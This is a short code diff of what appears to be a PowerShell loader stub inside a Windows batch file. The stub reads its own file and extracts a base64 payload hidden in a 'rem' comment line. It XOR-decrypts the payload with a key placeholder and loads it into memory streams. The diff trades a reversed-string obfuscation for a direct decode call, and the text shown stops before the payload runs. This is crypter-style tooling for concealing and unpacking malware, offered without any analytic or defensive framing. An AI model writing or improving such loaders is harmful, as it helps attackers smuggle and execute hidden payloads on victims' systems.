@@ -1,10 +1,7 @@
-﻿$tbsreversed_var = 'gnirtS46esaBmorF'.ToCharArray();
-[array]::Reverse($tbsreversed_var);
-$tbs_var = [String]::new($tbsreversed_var);
-$contents_var = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);
-$lastline_var = $contents_var[$contents_var.Length - 1];
-$payload_var = [System.Convert]::$tbs_var($lastline_var);
-$key_var = [System.Convert]::$tbs_var('DECRYPTION_KEY');
+﻿$contents_var = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);
+foreach ($line_var in $contents_var) { if ($line_var.Contains('rem')) {  $lastline_var = $line_var.Substring(4); break; }; };
+$payload_var = [System.Convert]::FromBase64String($lastline_var);
+$key_var = [System.Convert]::FromBase64String('DECRYPTION_KEY');
 for ($i = 0; $i -le $payload_var.Length - 1; $i++) { $payload_var[$i] = ($payload_var[$i] -bxor $key_var[$i %% $key_var.Length]); };
 $msi_var = New-Object System.IO.MemoryStream(, $payload_var);
 $mso_var = New-Object System.IO.MemoryStream;
